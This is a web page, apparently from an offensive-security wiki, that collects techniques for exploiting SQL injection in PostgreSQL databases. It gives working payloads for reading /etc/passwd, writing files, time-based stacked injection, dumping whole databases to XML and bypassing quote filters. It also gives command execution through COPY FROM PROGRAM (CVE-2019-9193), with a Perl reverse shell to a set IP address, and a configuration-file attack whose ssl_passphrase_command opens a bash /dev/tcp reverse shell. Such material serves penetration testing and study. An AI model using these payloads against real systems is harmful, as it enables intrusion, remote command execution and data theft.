<h1 id="PostgreSQL-injection"><a href="#PostgreSQL-injection" class="headerlink" title="PostgreSQL injection"></a>PostgreSQL injection</h1><p><strong>This page aims to explain different tricks that could help you to exploit a SQLinjection found in a postgresql database and to compliment the tricks you can find on</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md" target="_blank" rel="noopener"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md</strong></a>****</p>
<h2 id="Network-Interaction-Privilege-Escalation-Port-Scanner-NTLM-challenge-response-disclosure-amp-Exfiltration"><a href="#Network-Interaction-Privilege-Escalation-Port-Scanner-NTLM-challenge-response-disclosure-amp-Exfiltration" class="headerlink" title="Network Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure &amp; Exfiltration"></a>Network Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure &amp; Exfiltration</h2><p><strong><code>dblink</code></strong> is a <strong>PostgreSQL module</strong> that offers several interesting options from the attacker point of view. It can be used to <strong>connect to other PostgreSQL instances</strong> of perform <strong>TCP connections</strong>.<br><strong>These functionalities</strong> along with the <strong><code>COPY FROM</code></strong> functionality can be used to <strong>escalate privileges</strong>, perform <strong>port scanning</strong> or grab <strong>NTLM challenge responses</strong>.<br><a href="network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md"><strong>You can read here how to perform these attacked.</strong></a>****</p>
<h3 id="Exfiltration-example-using-dblink-and-large-objects"><a href="#Exfiltration-example-using-dblink-and-large-objects" class="headerlink" title="Exfiltration example using dblink and large objects"></a><strong>Exfiltration example using dblink and large objects</strong></h3><p>You can <a href="dblink-lo_import-data-exfiltration.md"><strong>read this example</strong></a> ****to see a CTF example of <strong>how to load data inside large objects and then exfiltrate the content of large objects inside the username</strong> of the function <code>dblink_connect</code>.</p>
<h2 id="PL-pgSQL-password-bruteforce"><a href="#PL-pgSQL-password-bruteforce" class="headerlink" title="PL/pgSQL password bruteforce"></a>PL/pgSQL password bruteforce</h2><p>PL/pgSQL, as a <strong>fully featured programming language</strong>, allows much more procedural control than SQL, including the <strong>ability to use loops and other control structures</strong>. SQL statements and triggers can call functions created in the PL/pgSQL language.<br><strong>You can abuse this language in order to ask PostgreSQL to brute-force the users credentials.</strong> <a href="pl-pgsql-password-bruteforce.md"><strong>Read this to learn how.</strong></a>****</p>
<h2 id="File-system-actions"><a href="#File-system-actions" class="headerlink" title="File-system actions"></a>File-system actions</h2><h3 id="Read-directories-and-files"><a href="#Read-directories-and-files" class="headerlink" title="Read directories and files"></a>Read directories and files</h3><p>From this <a href="https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a" target="_blank" rel="noopener">commit </a>members of the <code>DEFAULT_ROLE_READ_SERVER_FILES</code> group and super users can use these methods on any path (check out <code>convert_and_check_filename</code> in <code>genfile.c</code>).:</p>
<pre><code class="sql">select * from pg_ls_dir(&#39;/tmp&#39;);
select * from pg_read_file(&#39;/etc/passwd&#39; , 0 , 1000000);
</code></pre>
<h3 id="Simple-File-Writing"><a href="#Simple-File-Writing" class="headerlink" title="Simple File Writing"></a>Simple File Writing</h3><pre><code class="bash">copy (select convert_from(decode(&#39;&lt;ENCODED_PAYLOAD&gt;&#39;,&#39;base64&#39;),&#39;utf-8&#39;)) to &#39;/just/a/path.exec&#39;;
</code></pre>
<p>Remember that COPY cannot handle newline chars, therefore even if you are using a base64 payload y<strong>ou need to send a one-liner</strong>.<br>A very important limitation of this technique is that <strong><code>copy</code> cannot be used to write binary files as it modify some binary values.</strong></p>
<h3 id="Binary-files-upload"><a href="#Binary-files-upload" class="headerlink" title="Binary files upload"></a><strong>Binary files upload</strong></h3><p>However, there are <strong>other techniques to upload big binary files</strong>.<br><a href="big-binary-files-upload-postgresql.md"><strong>Read this page to learn how to do it.</strong></a>****</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="CVE-2019–9193-RCE-from-version-9-3-to-11-2"><a href="#CVE-2019–9193-RCE-from-version-9-3-to-11-2" class="headerlink" title="CVE-2019–9193 RCE from version 9.3 to 11.2"></a>CVE-2019–9193 <strong>RCE from version 9.3 to 11.2</strong></h3><p>Since<a href="https://www.postgresql.org/docs/9.3/release-9-3.html" target="_blank" rel="noopener"> version 9.3</a>, new functionality for ‘<a href="https://paquier.xyz/postgresql-2/postgres-9-3-feature-highlight-copy-tofrom-program/" target="_blank" rel="noopener">COPY TO/FROM PROGRAM</a>‘ was implemented. This allows the database superuser, and any user in the ‘pg_execute_server_program’ group to run arbitrary operating system commands.</p>
<pre><code class="bash">#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM &#39;id&#39;;
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM &#39;perl -MIO -e &#39;&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.0.104:80&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&#39;&#39;;
</code></pre>
<p>Or use the <code>multi/postgres/postgres_copy_from_program_cmd_exec</code> module from <strong>metasploit</strong>.<br>More information about this vulnerability <a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5" target="_blank" rel="noopener"><strong>here</strong></a>.</p>
<h3 id="RCE-with-PostgreSQL-extensions"><a href="#RCE-with-PostgreSQL-extensions" class="headerlink" title="RCE with PostgreSQL extensions"></a>RCE with PostgreSQL extensions</h3><p>Once you have <strong>learned</strong> from the previous post <strong>how to upload binary files</strong> you could try obtain <strong>RCE uploading a postgresql extension and loading it</strong>.<br><a href="rce-with-postgresql-extensions.md"><strong>Lear how to abuse this functionality reading this post.</strong></a>****</p>
<h3 id="PostgreSQL-configuration-file-RCE"><a href="#PostgreSQL-configuration-file-RCE" class="headerlink" title="PostgreSQL configuration file RCE"></a>PostgreSQL configuration file RCE</h3><p>The <strong>configuration file</strong> of postgresql is <strong>writable</strong> by the <strong>postgres user</strong> which is the one running the database, so as <strong>superuser</strong> you can write files in the filesystem, and therefore you can <strong>overwrite this file.</strong></p>
<p><img src="../../../.gitbook/assets/image%20(232).png"></p>
<p>The configuration file have some interesting attributes that can lead to RCE:</p>
<ul>
<li><code>ssl_key_file = &#39;/etc/ssl/private/ssl-cert-snakeoil.key&#39;</code> Path to the private key of the database</li>
<li><code>ssl_passphrase_command = &#39;&#39;</code> If the private file is protected by password (encrypted) postgresql will <strong>execute the command indicated in this attribute</strong>.</li>
<li><code>ssl_passphrase_command_supports_reload = off</code> <strong>If</strong> this attribute is <strong>on</strong> the <strong>command</strong> executed if the key is protected by password <strong>will be executed</strong> when <code>pg_reload_conf()</code> is <strong>executed</strong>.</li>
</ul>
<p>Then, an attacker will need to:</p>
<ol>
<li><strong>Dump private key</strong> from the server</li>
<li><strong>Encrypt</strong> downloaded private key:<ol>
<li><code>rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key</code></li>
</ol>
</li>
<li><strong>Overwrite</strong> </li>
<li><strong>Dump</strong> the current postgresql <strong>configuration</strong></li>
<li><strong>Overwrite</strong> the <strong>configuration</strong> with the mentioned attributes configuration:<ol>
<li><code>ssl_passphrase_command = &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/8111 0&gt;&amp;1&quot;&#39;</code></li>
<li><code>ssl_passphrase_command_supports_reload = on</code></li>
</ol>
</li>
<li>Execute <code>pg_reload_conf()</code></li>
</ol>
<p>While testing this I noticed that this will only work if the <strong>private key file has privileges 640</strong>, it’s <strong>owned by root</strong> and by the <strong>group ssl-cert or postgres</strong> (so the postgres user can read it), and is placed in <em>/var/lib/postgresql/12/main</em>.</p>
<p><strong>More</strong> <a href="https://pulsesecurity.co.nz/articles/postgres-sqli" target="_blank" rel="noopener"><strong>information about this technique here</strong></a><strong>.</strong></p>
<h2 id="WAF-bypass"><a href="#WAF-bypass" class="headerlink" title="WAF bypass"></a>WAF bypass</h2><h3 id="PostgreSQL-String-functions"><a href="#PostgreSQL-String-functions" class="headerlink" title="PostgreSQL String functions"></a>PostgreSQL String functions</h3><p>Manipulating strings could help you to <strong>bypass WAFs or other restrictions</strong>.<br><a href="https://www.postgresqltutorial.com/postgresql-string-functions/" target="_blank" rel="noopener"><strong>In this page</strong> </a><strong>you can find some useful Strings functions.</strong></p>
<h3 id="Stacked-Queries"><a href="#Stacked-Queries" class="headerlink" title="Stacked Queries"></a>Stacked Queries</h3><p>Remember that postgresql support stacked queries, but several application will throw an error if 2 responses are returned when expecting just 1. But, you can still abuse the stacked queries via Time injection:</p>
<pre><code class="text">id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting(&#39;is_superuser&#39;))=&#39;on&#39; then pg_sleep(10) end;-- -
</code></pre>
<h3 id="XML-tricks"><a href="#XML-tricks" class="headerlink" title="XML tricks"></a>XML tricks</h3><h4 id="query-to-xml"><a href="#query-to-xml" class="headerlink" title="query_to_xml"></a>query_to_xml</h4><p>This function will return all the data in XML format in just one file. It’s ideal if you want to dump a lot of data in just 1 row:</p>
<pre><code class="sql">SELECT query_to_xml(&#39;select * from pg_user&#39;,true,true,&#39;&#39;);
</code></pre>
<h4 id="database-to-xml"><a href="#database-to-xml" class="headerlink" title="database_to_xml"></a>database_to_xml</h4><p>This function will dump the whole database in XML format in just 1 row (be careful if the database is very big as you may DoS it or even your own client):</p>
<pre><code class="sql">SELECT database_to_xml(true,true,&#39;&#39;);
</code></pre>
<h3 id="Forbidden-quotes"><a href="#Forbidden-quotes" class="headerlink" title="Forbidden quotes"></a>Forbidden quotes</h3><p>If cannot use quotes for your payload you could bypass this with <code>CHR</code> for basic clauses (_character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements_):</p>
<pre><code class="text">SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
</code></pre>
<p>Or with <code>$</code>. This queries return the same results:</p>
<pre><code class="text">SELECT &#39;hacktricks&#39;;
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
</code></pre>
